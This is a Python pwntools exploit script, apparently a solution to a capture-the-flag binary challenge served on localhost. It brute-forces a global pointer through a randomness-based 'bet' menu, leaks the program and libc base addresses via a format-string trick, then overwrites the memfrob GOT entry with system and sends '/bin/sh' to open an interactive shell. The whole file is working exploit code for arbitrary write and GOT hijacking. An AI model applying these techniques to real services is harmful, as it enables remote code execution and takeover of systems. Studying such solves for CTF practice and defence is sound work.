from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

context.binary = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
# io = process([exe.path])¨
io = remote("localhost", 50000)
# io = gdb.debug([exe.path], gdbscript="""""")


def set_ptr(p, target_val):
    """
    Sets the global 'ptr' to target_val using the
    bswap+getrandom partial overwrite oracle.
    """
    log.info(f"Attempting to set ptr to {hex(target_val)}")

    # We iterate from length 8 down to 1.
    # length 8: Randomizes all bytes. We wait until the LSB matches.
    # length 7: Randomizes top 7 bytes. The LSB (index 7) is preserved. We wait for 2nd LSB.
    # ...
    for length in range(8, 0, -1):
        # Calculate which byte of the target we are currently trying to 'lock in'
        # The logic:
        # Length 8 locks index 7 (LSB, shift 0)
        # Length 7 locks index 6 (Next byte, shift 8)
        # Length 1 locks index 0 (MSB, shift 56)
        shift_bits = (8 - length) * 8
        wanted_byte = (target_val >> shift_bits) & 0xFF

        # Create a progress logger
        prog = log.progress(f"Bruting byte {length-1} (Target: {hex(wanted_byte)})")

        while True:
            # 1. Enter the "Try your luck" menu
            p.sendlineafter(b"> ", b"1")

            # 2. Send the bet size (number of bytes to randomize)
            p.sendlineafter(b"bet: ", str(length).encode())

            # 3. Parse the result
            # Expected output: "Congratulations! You won: 0x..."
            p.recvuntil(b"won: ")
            leaked_addr_str = p.recvline().strip()
            current_ptr_val = int(leaked_addr_str, 16)

            # 4. Extract the specific byte we care about in this iteration
            # We check if the byte at the position we are about to "leave alone" next round matches
            current_byte = (current_ptr_val >> shift_bits) & 0xFF

            if current_byte == wanted_byte:
                prog.success(
                    f"Locked byte {hex(wanted_byte)}! Current ptr: {hex(current_ptr_val)}"
                )
                break

            # Optional: Start a new line for visual clarity if it takes too long
            # else:
            #    print(".", end="")


def shoot(value):
    """
    Uses the "Shoot your shot" menu option to write 'value' to the current 'ptr'.
    """
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(value).encode())
    log.info(f"Wrote {hex(value)} to ptr")


io.sendlineafter(b"> ", b"1")
io.sendlineafter(b":", b"1")

leak = int(io.recvuntil(b"\n").strip().split(b": 0x")[-1][2:], 16) - 0x4058
exe.address = leak
print(f"base: {hex(leak)}")

writes = exe.address + 0x0004050

set_ptr(io, writes)
shoot(0x1337)

set_ptr(io, exe.got["memfrob"])
shoot(exe.plt["printf"])

io.sendlineafter(b"> ", b"67")
io.sendlineafter(b"lil bro", b"%p %p %p")

io.recvline()

leak = int(io.recvline().split(b" ")[2][2:], 16) - 0xF829D
print(f"libc: {hex(leak)}")
libc.address = leak

set_ptr(io, exe.got["memfrob"])
shoot(libc.symbols["system"])

io.sendlineafter(b"> ", b"67")
io.sendlineafter(b"lil bro", b"/bin/sh")

io.interactive()
